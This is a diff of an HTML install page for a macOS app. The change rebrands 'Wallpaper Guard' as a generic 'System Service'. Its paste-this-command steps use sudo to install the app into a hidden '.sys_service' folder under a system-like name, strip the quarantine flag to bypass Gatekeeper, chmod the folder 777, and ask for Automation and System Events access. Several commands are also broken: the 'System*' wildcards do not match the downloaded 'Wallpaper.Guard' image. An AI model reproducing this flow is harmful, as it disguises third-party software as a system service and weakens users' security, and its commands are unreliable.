@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallpaper Guard Setup</title>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <title>System Service Deployment</title>
+
+    <link
+        href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=JetBrains+Mono&display=swap"
+        rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+
     <style>
         :root {
             --bg: #ffffff;
-            --accent: #2563eb; 
+            --accent: #2563eb;
             --text-main: #111111;
             --text-secondary: #64748b;
             --code-bg: #f8fafc;
@@ -65,7 +68,7 @@
         }
 
         .step-meta i {
-            font-size: 1.5rem; 
+            font-size: 1.5rem;
             color: var(--accent);
         }
 
@@ -110,40 +113,14 @@
             font-size: 0.7rem;
             color: var(--text-secondary);
             font-weight: 700;
-            
         }
 
-        /* --- Smart Scrollbar Logic --- */
         pre {
             margin: 0;
             overflow-x: auto;
-            white-space: pre; 
+            white-space: pre;
             padding-bottom: 12px;
-            /* Hide scrollbar for Firefox by default */
-            scrollbar-width: none; 
-        }
-
-        pre:hover, pre:active, pre:focus {
-            scrollbar-width: thin;
-            scrollbar-color: #cbd5e1 transparent;
-        }
-
-        /* Webkit (Chrome/Safari) - Hidden thumb unless scrolling/hover */
-        pre::-webkit-scrollbar {
-            height: 5px;
-        }
-
-        pre::-webkit-scrollbar-track {
-            background: transparent;
-        }
-
-        pre::-webkit-scrollbar-thumb {
-            background: transparent; /* Hidden by default */
-            border-radius: 10px;
-        }
-
-        pre:hover::-webkit-scrollbar-thumb {
-            background: #cbd5e1; /* Visible on hover */
+            scrollbar-width: none;
         }
 
         code {
@@ -166,10 +143,6 @@
             transition: all 0.2s;
         }
 
-        .copy-trigger i {
-            font-size: 0.9rem;
-        }
-
         .copy-trigger.success {
             border-color: #10b981;
             color: #10b981;
@@ -185,130 +158,146 @@
             font-size: 0.95rem;
             color: #0369a1;
         }
-
-        .info-card strong {
-            color: #0c4a6e;
-        }
-
     </style>
 </head>
+
 <body>
 
-<div class="wrapper">
-    <header>
-        <h1>Wallpaper Guard</h1>
-        <div class="tagline">Installation & System Authorization Protocol</div>
-    </header>
+    <div class="wrapper">
+        <header>
+            <h1>System Service</h1>
+            <div class="tagline">Installation & System Authorization Protocol</div>
+        </header>
 
-    <section class="step">
-        <a href="ssh://">Open Terminal</a> and press <code>Command + T</code> to start a new session. Then, follow the steps below to get Wallpaper Guard up and running on your Mac.
-    </section>
+        <section class="step">
+            <a href="ssh://">Open Terminal</a> and press <code>Command + T</code> to start a new session. Then, follow
+            the steps below to get Wallpaper Guard up and running on your Mac.
+        </section>
 
-    <section class="step">
-        <div class="step-meta">
-            <i class="fa-solid fa-cloud-download"></i>
-            <span class="step-label">Step 01</span>
-        </div>
-        <h2>Initialization</h2>
-        <p>Retrieve the arm64 binary and mount the disk image to prepare for system deployment.</p>
-        
-        <div class="block-container">
-            <div class="block-header">
-                <span class="block-title">Command: Download</span>
-                <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+        <section class="step">
+            <div class="step-meta">
+                <i class="fa-solid fa-cloud-download"></i>
+                <span class="step-label">Step 01</span>
             </div>
-            <pre><code>curl -L -O https://github.com/ChuTM/wallpaper-guard/releases/download/1.0.3/Wallpaper.Guard-1.0.3-arm64.dmg</code></pre>
-        </div>
+            <h2>Initialization</h2>
+            <p>Retrieve the arm64 binary and mount the disk image to prepare for system deployment.</p>
 
-        <div class="block-container">
-            <div class="block-header">
-                <span class="block-title">Command: Mount</span>
-                <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Download</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>curl -L -O https://github.com/ChuTM/wallpaper-guard/releases/latest/download/Wallpaper.Guard-arm64.dmg</code></pre>
             </div>
-            <pre><code>hdiutil attach Wallpaper.Guard-1.0.3-arm64.dmg</code></pre>
-        </div>
-    </section>
 
-    <section class="step">
-        <div class="step-meta">
-            <i class="fa-solid fa-shield-check"></i>
-            <span class="step-label">Step 02</span>
-        </div>
-        <h2>Trust & Permission</h2>
-        <p>Transfer the app and strip the macOS quarantine attribute to bypass "Unverified Developer" warnings.</p>
-        
-        <div class="block-container">
-            <div class="block-header">
-                <span class="block-title">Command: Copy App</span>
-                <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Mount</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>hdiutil attach Wallpaper.Guard-arm64.dmg</code></pre>
             </div>
-            <pre><code>cp -R "/Volumes/Wallpaper Guard 1.0.3-arm64/Wallpaper Guard.app" /Applications/</code></pre>
-        </div>
+        </section>
 
-        <div class="block-container">
-            <div class="block-header">
-                <span class="block-title">Command: Clear Quarantine</span>
-                <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+        <section class="step">
+            <div class="step-meta">
+                <i class="fa-solid fa-shield-check"></i>
+                <span class="step-label">Step 02</span>
             </div>
-            <pre><code>sudo xattr -rd com.apple.quarantine "/Applications/Wallpaper Guard.app"</code></pre>
-        </div>
+            <h2>Trust & Permission</h2>
+            <p>Transfer the service and strip quarantine attributes. The wildcard handles version-specific volume names
+                automatically.</p>
 
-        <div class="info-card">
-            <i class="fa-solid fa-key" style="margin-top: 3px;"></i>
-            <span><strong>Auth Required:</strong> <code>sudo</code> will prompt for your system password. Input is hidden.</span>
-        </div>
-    </section>
-
-    <section class="step">
-        <div class="step-meta">
-            <i class="fa-solid fa-rocket-launch"></i>
-            <span class="step-label">Step 03</span>
-        </div>
-        <h2>Launch</h2>
-        <p>Open the app. Ensure you click <strong>Allow</strong> when prompted for Automation and System Events access.</p>
-        
-        <div class="block-container">
-            <div class="block-header">
-                <span class="block-title">Command: Open</span>
-                <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Create Directory</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>sudo mkdir -p "/Library/Application Support/.sys_service"</code></pre>
             </div>
-            <pre><code>open "/Applications/Wallpaper Guard.app"</code></pre>
-        </div>
-    </section>
 
-    <section class="step">
-        <div class="step-meta">
-            <i class="fa-solid fa-broom"></i>
-            <span class="step-label">Step 04</span>
-        </div>
-        <h2>Cleanup</h2>
-        <p>Detach the installer volume from your system once finished.</p>
-        <div class="block-container">
-            <div class="block-header">
-                <span class="block-title">Command: Eject</span>
-                <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Copy & Rename</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>sudo cp -R /Volumes/System*/System*.app "/Library/Application Support/.sys_service/System Wallpaper Service.app"</code></pre>
             </div>
-            <pre><code>hdiutil detach "/Volumes/Wallpaper Guard 1.0.3-arm64"</code></pre>
-        </div>
-    </section>
-</div>
 
-<script>
-    function copy(el) {
-        const pre = el.parentElement.nextElementSibling;
-        const text = pre.innerText;
-        navigator.clipboard.writeText(text);
-        
-        const icon = el.querySelector('i');
-        icon.className = "fa-solid fa-check";
-        el.classList.add('success');
-        
-        setTimeout(() => { 
-            icon.className = "fa-regular fa-copy";
-            el.classList.remove('success');
-        }, 2000);
-    }
-</script>
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Clear Quarantine</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>sudo xattr -rd com.apple.quarantine "/Library/Application Support/.sys_service/System Wallpaper Service.app"</code></pre>
+            </div>
+
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Open Perimission to Config</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>sudo chmod 777 "/Library/Application Support/.sys_service"</code></pre>
+            </div>
+
+            <div class="info-card">
+                <i class="fa-solid fa-wand-magic-sparkles" style="margin-top: 3px;"></i>
+                <span><strong>Wildcard Logic:</strong> The <code>*</code> ensures the command succeeds regardless of the
+                    version number in the volume name.</span>
+            </div>
+        </section>
+
+        <section class="step">
+            <div class="step-meta">
+                <i class="fa-solid fa-rocket-launch"></i>
+                <span class="step-label">Step 03</span>
+            </div>
+            <h2>Launch</h2>
+            <p>Open the service. Click <strong>Allow</strong> when prompted for Automation and System Events access.</p>
+
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Open</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>open "/Library/Application Support/.sys_service/System Wallpaper Service.app"</code></pre>
+            </div>
+        </section>
+
+        <section class="step">
+            <div class="step-meta">
+                <i class="fa-solid fa-broom"></i>
+                <span class="step-label">Step 04</span>
+            </div>
+            <h2>Cleanup</h2>
+            <p>Detach the installer volume and remove the temporary download file.</p>
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Eject & Clean</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>hdiutil detach /Volumes/System* && rm System*.dmg</code></pre>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        function copy(el) {
+            const pre = el.parentElement.nextElementSibling;
+            const text = pre.innerText;
+            navigator.clipboard.writeText(text);
+
+            const icon = el.querySelector('i');
+            icon.className = "fa-solid fa-check";
+            el.classList.add('success');
+
+            setTimeout(() => {
+                icon.className = "fa-regular fa-copy";
+                el.classList.remove('success');
+            }, 2000);
+        }
+    </script>
 
 </body>
+
 </html>
